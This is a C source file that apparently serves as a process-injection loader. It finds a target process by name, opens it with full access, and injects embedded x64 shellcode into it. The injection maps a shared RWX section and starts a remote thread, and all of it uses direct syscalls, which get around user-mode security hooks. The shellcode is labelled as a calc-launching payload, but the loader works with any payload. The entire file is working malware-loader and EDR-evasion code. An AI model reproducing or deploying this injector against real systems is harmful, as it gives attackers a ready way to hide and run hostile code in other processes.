#include "base.h"

/// <summary>
///  Get remote process handle using Sw3NtQuerySystemInformation
/// </summary>
/// <param name="szProcessName"> Process name </param>
/// <param name="dwPid"> OUT: Process ID </param>
/// <param name="pHandle">OUT: Process handle</param>
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcessName, OUT DWORD* dwPid, OUT HANDLE* pHandle) {

    BOOL bState = TRUE;
    NTSTATUS STATUS = NULL;

    HMODULE hNtdll = NULL;
    PSYSTEM_PROCESS_INFORMATION ProcInfo = NULL;
    ULONG uReturnLength1 = NULL;
    ULONG uReturnLength2 = NULL;
    PVOID pValueToFree = NULL;

    /// Get System Information
    /*__kernel_entry NTSTATUS NtQuerySystemInformation(
        [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
        [in, out]       PVOID                    SystemInformation,
        [in]            ULONG                    SystemInformationLength,
        [out, optional] PULONG                   ReturnLength
    );*/
    // First NtQuerySystemInformation call will fail but provide information about how much memory needs to be allocated via uReturnLength
    STATUS = Sw3NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLength1);
    ProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLength1);
    if (!ProcInfo) {
        PRINT_ERROR("HeapAlloc");
        bState = FALSE;
        goto CLEANUP;
    }

    // Second NtQuerySystemInformation call
    STATUS = Sw3NtQuerySystemInformation(SystemProcessInformation, ProcInfo, uReturnLength1, &uReturnLength2);
    if (STATUS != 0x0) {
        PRINT_NTERROR("NtQuerySystemInformation");
        bState = FALSE;
        goto CLEANUP;
    }

    // Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
    pValueToFree = ProcInfo;

    // Loop over processes
    while (TRUE) {
        /// Compare every process name to the one we are looking ofr
        if (ProcInfo->ImageName.Length && wcscmp(ProcInfo->ImageName.Buffer, szProcessName) == 0) {
            *dwPid = ProcInfo->UniqueProcessId;
            *pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcInfo->UniqueProcessId);
            break;
        }

        // If NextEntryOffset is 0, we reached the end of the array
        if (!ProcInfo->NextEntryOffset)
            break;

        // Move to the next element in the array
        ProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)ProcInfo + ProcInfo->NextEntryOffset);
    }

    // Check if process was found
    if (*dwPid == NULL || *pHandle == NULL) {
        WARN_W(L"Process \"%s\" not found.", szProcessName);
        bState = FALSE;
    }

CLEANUP:

    HeapFree(GetProcessHeap(), 0, pValueToFree);

    return bState;
}

BOOL MappingInjectionViaDirectSyscalls(HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSize) {

    NTSTATUS STATUS = NULL; 
    BOOL bState = TRUE; 

    HANDLE hSection = NULL; 
    LARGE_INTEGER MaximumSize = {
        .HighPart = 0,
        .LowPart = sSize
    }; 
    HANDLE hLocalProcess = (HANDLE)-1; 
    PBYTE pLocalAddress = NULL; 
    PBYTE pRemoteAddress = NULL; 
    SIZE_T sViewSize = NULL; 
    HANDLE hThread = NULL; 
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };


    // Allocate local Map View using NtCreateSection and NtMapViewOfSection
    STATUS = Sw3NtCreateSection(&hSection, (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE), NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL); 
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("Sw3NtCreateSection"); 
        bState = FALSE; 
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] [RWX] Created section.", hSection); 
    
    STATUS = Sw3NtMapViewOfSection(hSection, hLocalProcess, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("Sw3NtMapViewOfSection [1]"); 
        bState = FALSE; 
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] [RW-] Allocated %d bytes in local process.", pLocalAddress, sViewSize); 

    // Copy payload to memory
    RtlCopyMemory(pLocalAddress, pShellcode, sSize); 
    OKAY("[ 0x%p ] Copied %d bytes to address.", pLocalAddress, sSize); 

    // Allocate remote Map View using NtMapViewOfSection
    STATUS = Sw3NtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE); 
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("Sw3NtMapViewOfSection [2]"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] [RWX] Allocated %d bytes in remote process.", pRemoteAddress, sViewSize); 

    // Execute payload using thread creation with NtCreateThreadEx
    STATUS = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PTHREAD_START_ROUTINE)pRemoteAddress, NULL, 0, 0, 0, 0, NULL); 
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("Sw3NtCreateThreadEx"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] Thread created.", hThread); 

    // Wait for the thread to finish executing
    STATUS = Sw3NtWaitForSingleObject(hThread, FALSE, NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("Sw3NtWaitForSingleObject"); 
        bState = FALSE;
        goto CLEANUP; 
    }

    INFO("Press [Enter] to unmap."); 
    getchar(); 

CLEANUP: 

    // Unmap local view using NtUnmapViewOfSection
    STATUS = Sw3NtUnmapViewOfSection(hLocalProcess, pLocalAddress); 
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("Sw3NtUnmapViewOfSection"); 
        bState = FALSE;
    }
    OKAY("[ 0x%p] Unmapped view in local process.", pLocalAddress); 

    // Unmap remote view using NtUnmapViewOfSection
    STATUS = Sw3NtUnmapViewOfSection(hProcess, pRemoteAddress);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("Sw3NtUnmapViewOfSection");
        bState = FALSE;
    }
    OKAY("[ 0x%p] Unmapped view in remote process.", pRemoteAddress);


    // Close Handles using NtCloseHandle
    if (hSection) {
        STATUS = Sw3NtClose(hSection); 
        if (STATUS != STATUS_SUCCESS) {
            PRINT_NTERROR("Sw3NtClose");
            bState = FALSE; 
        }
        OKAY("[ 0x%p ] Closed section handle", hSection); 
    }

    if (hThread) {
        STATUS = Sw3NtClose(hThread); 
        if (STATUS != STATUS_SUCCESS) {
            PRINT_NTERROR("Sw3NtClose");
            bState = FALSE;
        }
        OKAY("[ 0x%p ] Closed thread handle", hThread); 
    }

    return bState; 
}

int wmain(int argc, wchar_t* argv[]) {

    // x64 calc payload
    unsigned char pShellcode[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    };

    HANDLE hProcess = NULL; 
    DWORD dwProcessId = NULL; 

    if (argc < 2) {
        WARN_W(L"Usage: %s [process name].", argv[0]); 
        return EXIT_FAILURE; 
    }

    INFO_W(L"Searching for %s...", argv[1]); 
    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
        PRINT_ERROR("GetRemoteProcessHandle"); 
        return EXIT_FAILURE; 
    }
    OKAY_W(L"[ 0x%p ] [ %d ] Found process %s.", hProcess, dwProcessId, argv[1]);

    INFO("Injecting..."); 
    if (!MappingInjectionViaDirectSyscalls(hProcess, pShellcode, sizeof(pShellcode))) {
        PRINT_ERROR("MappingInjectionViaDirectSyscalls"); 
        return EXIT_FAILURE; 
    }
    INFO("Done."); 

    return EXIT_SUCCESS; 
}